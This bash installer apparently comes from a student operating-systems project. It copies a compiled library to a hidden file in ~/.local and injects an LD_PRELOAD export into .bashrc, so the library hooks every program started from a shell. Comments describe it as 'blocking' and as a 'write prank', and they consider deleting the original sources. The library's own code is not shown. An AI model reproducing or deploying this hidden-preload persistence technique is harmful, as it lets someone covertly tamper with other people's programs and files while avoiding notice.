#!/bin/bash

# IMPORTANT NOTE: make sure you have your own paths to the code here!!!
SOURCE_SO="$HOME/Documents/OS_Project/osProject/main/src/test/combinedMRWOC.so"
HIDDEN_SO="$HOME/.local/.libhidden.so"
RC_FILE="$HOME/.bashrc"

echo "[*] Starting installation..."
sleep 1
echo "Have fun copying my homework!"
sleep 1

# Ensure the source .so exists
if [ ! -f "$SOURCE_SO" ]; then
    echo "[✗] Error: Source .so file not found at: $SOURCE_SO"
    exit 1
fi

# Ensure ~/.local exists
mkdir -p "$HOME/.local"

# Copy .so to hidden location
cp "$SOURCE_SO" "$HIDDEN_SO"
chmod 755 "$HIDDEN_SO"  # Must be readable by the dynamic linker

# Optionally delete the original
#rm -f "$SOURCE_SO"
# maybe also add to remove the original .c file? 
# maybe also compile the combinedMRWOC.c in this bash script?

# Inject LD_PRELOAD into .bashrc if not already present
if ! grep -q "$HIDDEN_SO" "$RC_FILE"; then
    echo "" >> "$RC_FILE"
    echo "# [MRWOC] Auto-load LD_PRELOAD for blocking" >> "$RC_FILE"
    echo "export LD_PRELOAD=\"$HIDDEN_SO\"" >> "$RC_FILE"
    echo "[✓] LD_PRELOAD added to $RC_FILE"
fi

# Add alias for geary with DISABLE_WRITE_PRANK
if ! grep -q "alias geary=" "$RC_FILE"; then
    echo "# [MRWOC] Geary runs cleanly" >> "$RC_FILE"
    echo "alias geary='DISABLE_WRITE_PRANK=1 geary'" >> "$RC_FILE"
    echo "[✓] Geary alias added to $RC_FILE"
fi

echo "[✓] Install complete."
echo "[i] Open a new terminal, or run:"
echo "    source ~/.bashrc"
